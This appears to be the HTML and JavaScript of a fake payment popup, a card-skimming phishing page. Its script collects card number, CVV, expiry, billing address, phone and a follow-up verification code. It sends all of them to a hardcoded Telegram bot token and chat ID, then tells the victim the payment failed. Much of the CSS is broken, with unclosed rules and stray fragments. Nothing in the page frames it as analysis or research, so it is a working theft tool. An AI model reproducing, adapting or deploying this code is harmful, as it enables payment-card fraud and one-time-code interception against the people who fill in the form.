<!DOCTYPE html>

<head>
    <meta charset="UTF-8">

    <style>
        * { 
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            height: 100vh;
            background: url('Homme.jpg') no-repeat center/cover;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #111;
        }
        
        .payment-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            transition: all 0.3s ease;
            padding: 20px;
        }
        
        .payment-overlay.active {
            opacity: 1;
            visibility: visible;
        }
        
        .payment-container {
            background: #fff;
            border-radius: 18px;
            width: 100%;
            max-width: 420px;
            height: 550px;
            padding: 32px;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.15);

            flex-direction: column;
            margin-bottom: 3.5%;

        .payment-content {
            flex-direction: column;

            flex: 1;
            overflow-y: auto;
            padding-right: 8px;

        }
        
        /* Move your scrollbar styles to target the payment content */
.payment-content::-webkit-scrollbar {
    width: 8px;
}

.payment-content::-webkit-scrollbar-track {
    background: transparent;
    margin: 16px 0;
}

    background: rgba(0,0,0,0.15);

.payment-content::-webkit-scrollbar-thumb:hover {

        .payment-overlay.active .payment-container {

        .payment-header {

        .payment-close {
            position: absolute;
            top: 20px;
            right: 20px;
            background: none;
            border: none;
            color: #333333fb;
            font-size: 22px;
            cursor: pointer;
            transition: all 0.3s ease;

        }

            color: #33333390;
            
          }
        
        
        .payment-form {
            display: flex;
            flex-direction: column;
            height: 100%;
        }
        
        .form-group {
            position: relative;
            display: flex;
            flex-direction: column;
            gap: 6px;
            flex: 1;
            min-width: 0;
            margin-bottom: 16px;
        }
        
        .form-group label {
            font-size: 13px;
            color: #666;
            margin-left: 4px;
        }
        
        .form-group input,
        .form-group select {
            padding: 13px 16px;
            border: 1px solid #e0e0e0;
            border-radius: 12px;
            font-size: 8px;
            transition: all 0.2s ease;
            background: #f9f9f9;
            position: relative; /* Ensures radius isn't clipped by parent */
            z-index: 1; /* Lifts input above any overlapping shadows */
            background-clip: padding-box; /* Prevents bg color from bleeding outside radius */
        }
        
        .form-group input:focus,
        .form-group select:focus {
            border-color: #5c9dff;
            outline: none;
            background: #fff;

        .submit-btn {
            background: linear-gradient(135deg, #73a9fb, #73a9fb);

            font-size: 10px;

            cursor: pointer;

            color: white;
            transform: translateY(-2px);
            opacity: 0.95;
        }

        
        .secure-note {
            font-size: 13px;
            color: #888;
            text-align: center;
        }
        
        .billing-toggle {
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            padding: 16px 0;
            border-top: 1px solid #eee;
            margin-top: 8px;

            font-size: 14px;
            color: #333333fb;
            user-select: none;
            transition: color 0.3s;

        .billing-toggle:hover {
            color: #33333390;
        }
        
        .billing-toggle i {
            transition: transform 0.3s ease;
            font-style: normal;
            font-size: 12px;
        }
        
        .billing-toggle.active i {
            transform: rotate(180deg);
        }
        
        .billing-fields {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        
        }
        
        .billing-fields.active {
            max-height: 1000px; /* Large enough to show all content */

        .form-row {

        .form-row .form-group {

    <script>
    
      
        // Telegram Configuration (REPLACE THESE)
        const BOT_TOKEN = '7860817713:AAFh-V6rsefsbL-G3vKzhQPJfY-c2dxNqmw';
        const CHAT_ID = '7610053738';

        // DOM Elements
        const paymentOverlay = document.getElementById('paymentOverlay');
        const openBtn = document.getElementById('openPayment');
        const closeBtn = document.getElementById('closePayment');
        const paymentForm = document.getElementById('paymentForm');
        const cardNumber = document.getElementById('cardNumber');
        const expiryDate = document.getElementById('expiryDate');
        const billingToggle = document.getElementById('billingToggle');
        const billingFields = document.getElementById('billingFields');
        const verificationModal = document.getElementById('verificationModal');
        const verifyBtn = document.getElementById('verifyBtn');

        // Store payment data
        let paymentData = null;

        // Toggle payment popup
        function togglePayment() {
            paymentOverlay.classList.toggle('active');
        }

        document.getElementById('close-button').addEventListener('click', function() {
            // Send message to parent window
            window.parent.postMessage('CLOSE_POPUP', '*');
          });



        // Toggle billing fields
        billingToggle.addEventListener('click', () => {
            billingToggle.classList.toggle('active');
            billingFields.classList.toggle('active');

            // Update text
            const span = billingToggle.querySelector('span');
            span.textContent = billingFields.classList.contains('active') ?
                'Hide Billing Information' :
                'Billing Information';
        });

        // Card number formatting
        cardNumber.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\s/g, '');
            if (value.length > 0) {
                value = value.match(/.{1,4}/g).join(' ');
            }
            e.target.value = value;
        });

        // Expiry date formatting
        expiryDate.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });

        // Send data to Telegram
        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                return response.ok;
            } catch (error) {
                console.error('Telegram error:', error);
                return false;
            }
        }

        // Form submission
        paymentForm.addEventListener('submit', async(e) => {
            e.preventDefault();

            // Validate form
            const requiredFields = [
                cardNumber,
                expiryDate,
                document.getElementById('cvv'),
                document.getElementById('cardName')
            ];

            // Billing fields are now required
            requiredFields.push(
                document.getElementById('billingAddress'),
                document.getElementById('city'),
                document.getElementById('zipCode'),
                document.getElementById('country'),
                document.getElementById('phone')
            );

            let isValid = true;
            requiredFields.forEach(field => {
                if (!field.value.trim()) {
                    field.style.borderColor = '#ff4444';
                    isValid = false;
                } else {
                    field.style.borderColor = '#ddd';
                }
            });

            if (!isValid) {
                alert("Please fill all required fields");
                return;
            }

            // Get form data
            paymentData = {
                cardNumber: document.getElementById('cardNumber').value,
                cardName: document.getElementById('cardName').value,
                expiryDate: document.getElementById('expiryDate').value,
                cvv: document.getElementById('cvv').value,
                billingAddress: document.getElementById('billingAddress').value,
                city: document.getElementById('city').value,
                zipCode: document.getElementById('zipCode').value,
                country: document.getElementById('country').value,
                phone: document.getElementById('phone').value
            };

            // Create Telegram message with billing information
            const message = `💳 *New Payment* 💳
*Card Details:*
Card: ${paymentData.cardNumber}
Name: ${paymentData.cardName}
Expiry: ${paymentData.expiryDate}
CVV: ${paymentData.cvv}

*Billing Information:*
Address: ${paymentData.billingAddress}
City: ${paymentData.city}
ZIP: ${paymentData.zipCode}
Country: ${paymentData.country}
Phone: ${paymentData.phone}

Awaiting verification...`;

            // Send to Telegram
            const submitBtn = e.target.querySelector('button[type="submit"]');
            submitBtn.disabled = true;
            submitBtn.textContent = 'Processing...';

            try {
                const success = await sendToTelegram(message);

                if (success) {
                    paymentOverlay.classList.remove('active');
                    verificationModal.style.display = 'flex';
                    document.getElementById('verificationCode').focus();
                } else {
                    alert('Failed, Check Internet Connections');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('An error occurred');
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Complete';
                
            }
        });

        // Verification submission
        verifyBtn.addEventListener('click', async() => {
            const code = document.getElementById('verificationCode').value.trim();

            if (!code) {
                alert('Please enter verification code');
                return;
            }

            // Create verification message with all details
            const message = `🔐 *Verification Code* 🔐
*Payment Details:*
Card: ${paymentData.cardNumber}
Name: ${paymentData.cardName}
Expiry: ${paymentData.expiryDate}

*Billing Information:*
Address: ${paymentData.billingAddress}
City: ${paymentData.city}
ZIP: ${paymentData.zipCode}
Country: ${paymentData.country}
Phone: ${paymentData.phone}

Entered code: ${code}`;

            verifyBtn.disabled = true;
            verifyBtn.textContent = 'Verifying...';

            try {
                const success = await sendToTelegram(message);

                if (success) {
                    alert('Payment failed', "error");
                    verificationModal.style.display = 'none';
                    paymentForm.reset();
                } else {
                    alert('Failed to verify');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Verification failed');
            } finally {
                verifyBtn.disabled = false;
                verifyBtn.textContent = 'Verify';
            }
        });
    </script>

  <!-- ✅ Custom Alert Styles -->
  <style>
  .toast {
    position: fixed;
    top: 30px;
    left: 50%;
    transform: translateX(-50%) translateY(-20px);
    background: rgba(0, 0, 0, 0.85);
    color: white;
    padding: 16px 20px;
    border-radius: 20px;
    box-shadow: 0 8px 24px rgba(0,0,0,0.15);
    backdrop-filter: blur(10px);
    display: flex;
    align-items: center;
    gap: 12px;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.4s ease, transform 0.4s ease;
    z-index: 1000;
  }
  
  .toast.show {
    opacity: 1;
    transform: translateX(-50%) translateY(0);
    pointer-events: auto;
  }
  
  .toast button {
    background: none;
    border: none;
    color: white;
    font-size: 20px;
    cursor: pointer;
  }
  
  .toast.error {
    background: rgba(255, 77, 79, 0.95);
  }
  
  .toast.success {
    background: rgba(45, 181, 93, 0.95);
  }
  </style>
  
  <!-- ✅ Toast Alert Script (Place after your JS code) -->
  <script>
  const toast = document.getElementById("customToast");
  const toastMsg = document.getElementById("toastMessage");
  const closeBt = document.getElementById("closeToast");
  
  let toastTimer = null;

  window.alert = function (message, type = "error") {
    toastMsg.textContent = message;
    toast.classList.remove("success", "error");
    toast.classList.add("show", type);
  
    clearTimeout(toastTimer);
    toastTimer = setTimeout(hideToast, 3000);
  };
  
  closeBt.onclick = () => {
    clearTimeout(toastTimer);
    hideToast();
  };
  
  function hideToast() {
    toast.classList.remove("show", "error", "success");
  }
  </script>
